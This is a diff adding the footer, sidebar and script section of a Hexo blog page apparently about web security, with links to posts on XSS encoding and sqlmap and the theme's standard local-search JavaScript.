+              <a href="/2019/10/30/XSS编码/" rel="next" title="XSS编码">
+                <i class="fa fa-chevron-left"></i> XSS编码
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/10/31/Sqlmap注入工具的使用/" rel="prev" title="Sqlmap注入工具的使用">
+                Sqlmap注入工具的使用 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/2.jpg" alt="陈浩东">
+            
+              <p class="site-author-name" itemprop="name">陈浩东</p>
+              <p class="site-description motion-element" itemprop="description">网络安全入狱指南</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">33</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">陈浩东</span>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">36.5k</span>
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      访客数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+  
+<script src="/live2d-widget/autoload.js"></script>
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
